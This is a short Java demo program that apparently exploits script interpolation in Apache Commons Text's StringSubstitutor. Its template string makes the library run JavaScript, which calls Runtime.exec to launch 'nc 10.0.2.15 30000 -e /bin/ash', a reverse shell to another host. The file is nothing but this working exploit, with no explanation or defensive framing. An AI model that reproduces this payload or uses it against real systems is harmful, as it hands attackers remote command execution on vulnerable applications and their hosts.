package com.example.demo;
import org.apache.commons.text.StringSubstitutor;

public class DemoApplication {
	public static void main(String[] args) {
		StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
		String templateString = "${script:javascript:java.lang.Runtime.getRuntime().exec(\"nc 10.0.2.15 30000 -e /bin/ash\");}";
		String resolvedString = interpolator.replace(templateString);

		while (true) {
		}
	}
}
